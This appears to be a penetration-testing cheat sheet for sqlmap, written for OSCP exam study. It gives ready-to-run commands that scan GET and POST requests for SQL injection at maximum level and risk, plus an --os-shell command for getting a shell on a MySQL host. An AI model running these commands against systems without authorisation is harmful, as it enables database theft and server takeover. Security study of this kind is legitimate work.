# sqlmap

```
Source: https://www.kali.org/tools/sqlmap/
Description: Automates detecting and exploiting SQL injection vulnerabilities in web applications

⚠️ DISCLAIMER: There are a number of tools you are not allowed to use in your OSCP exam
TEST:           SELECT ( IF ( 1=1, "Condition successful!", "Condition errored!" ) )

sqlmap -r login.req --level 5 --risk 3
    (login.req is text of Burp Suite intercept of a login request)

Get Request
    # Test All (Default Settings)
    sqlmap -u "http://192.168.0.1/database/inject.php?q=user" --batch

    # Test All (Default Settings, High Stress)
    sqlmap -u "http://192.168.0.1/database/inject.php?q=user" --batch --level=5 --risk=3

Post Request (Capture with BURP)
    # Test All (Default Settings)
    sqlmap --all -r post_request.txt --batch

    # Test All (Default Settings, High Stress)
    sqlmap --all -r post_request.txt --batch --level=5 --risk=3
    
    # Get A Reverse Shell (MySQL)
    sqlmap -r post_request.txt --dbms "mysql" --os-shell
```

## Back to README.md
[BACK](/README.md)